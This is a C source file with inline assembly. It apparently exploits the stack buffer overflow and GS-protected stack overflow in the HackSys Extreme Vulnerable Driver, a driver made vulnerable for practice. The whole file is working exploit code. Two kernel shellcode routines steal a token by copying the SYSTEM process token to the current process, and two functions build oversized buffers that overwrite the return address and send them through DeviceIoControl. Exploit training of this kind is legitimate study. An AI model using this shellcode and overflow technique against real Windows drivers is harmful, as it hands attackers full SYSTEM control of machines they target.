#include "BufferOverflow.h"
#pragma warning(disable:6385)
#ifndef _WIN64
__declspec(naked) StackExpShellcode() {

	__asm {
		pushad
		pushfd

		mov eax, fs: [0x124]
		mov eax, [eax + 0x150]
		mov edi, eax

	searchSystem:
		mov eax, [eax + 0x0b8]
		sub eax, 0x0b8
		cmp [eax + 0x0b4], 4
		jne searchSystem

		mov esi, eax
		mov eax, [esi + 0x0f8]
		mov [edi + 0x0f8], eax

		popfd
		popad

		xor eax, eax
		pop ebp
		ret 8
	}
}

// HEVD_IOCTL_BUFFER_OVERFLOW_STACK
BOOL StackExp(HANDLE hDevice) {
	BOOL res = TRUE;
	DWORD byteReturn = 0;
	PBYTE payload = malloc(0x20+sizeof(PVOID));
	PBYTE stackBuffer = malloc(0x800 + 0x100);
	if (!stackBuffer || !payload) return FALSE;
	
	memset(payload, 'a', 0x20);
	*(PVOID*)(payload + 0x20) = StackExpShellcode;
	memset(stackBuffer, 'a', 0x800);
	memcpy(stackBuffer+0x800, payload, 0x20 + sizeof(PVOID));

	res = DeviceIoControl(hDevice, HEVD_IOCTL_BUFFER_OVERFLOW_STACK, stackBuffer, 0x800 + 0x20 + sizeof(PVOID), NULL, 0, &byteReturn, NULL);
	
	return res;
}

__declspec(naked) StackGsExpShellcode() {
	__asm {
		pushad
		pushfd

		mov eax, fs: [0x124]
		mov eax, [eax + 0x150]
		mov edi, eax
	}
searchSystem:
	__asm {
		mov eax, [eax + 0x0b8]
		sub eax, 0x0b8
		cmp[eax + 0x0b4], 4
		jne searchSystem

		mov esi, eax
		mov eax, [esi + 0x0f8]
		mov[edi + 0x0f8], eax

		popfd
		popad

		xor eax, eax
		add esp, 0x770
		pop edi
		pop esi
		pop ebx
		add esp, 0x22c
		pop ebp
		retn 8
	}
}

BOOL StackGsExp(HANDLE hDevice) {
	BOOL res = TRUE;
	DWORD byteReturn = 0;
	ULONG payloadLength = 0x10 + sizeof(PVOID);
	//ULONG payloadLength = 0;
	//PBYTE payload = "aaaaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabaaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacaaacbaaccaacdaaceaacfaacgaachaaciaacjaackaacl";
	PBYTE payload = malloc(payloadLength);
	PBYTE stackBuffer = (PBYTE)VirtualAlloc(NULL,0x1000,MEM_COMMIT,PAGE_READWRITE);
	if (!stackBuffer || !payload) return FALSE;

	stackBuffer += (0x1000 - (0x200+payloadLength));
	memset(payload, 'a', 0x10);
	*(PVOID*)(payload + 0x10) = StackGsExpShellcode;	
	memset(stackBuffer, 'a', 0x200);
	memcpy(stackBuffer + 0x200, payload, payloadLength);

	res = DeviceIoControl(hDevice, HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS, stackBuffer, payloadLength+0x200+0x4, NULL, 0, &byteReturn, NULL);

	return res;
}
#endif

